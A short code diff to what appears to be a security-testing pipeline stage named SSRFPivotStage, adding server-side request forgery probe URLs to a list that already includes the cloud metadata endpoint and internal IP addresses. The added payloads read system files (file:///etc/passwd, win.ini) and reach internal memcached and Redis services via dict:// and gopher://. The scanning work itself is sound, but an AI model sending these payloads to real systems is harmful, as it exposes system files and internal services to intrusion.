@@ -21,7 +21,11 @@ class SSRFPivotStage(Stage):
         "http://169.254.169.254/latest/meta-data/",
         "http://localhost:8080",
         "http://10.0.0.1",
-        "http://172.17.0.1"
+        "http://172.17.0.1",
+        "file:///etc/passwd",
+        "file:///c:/windows/win.ini",
+        "dict://127.0.0.1:11211/stat",
+        "gopher://127.0.0.1:6379/_INFO",
     ]
 
     def is_enabled(self, context: PipelineContext) -> bool:
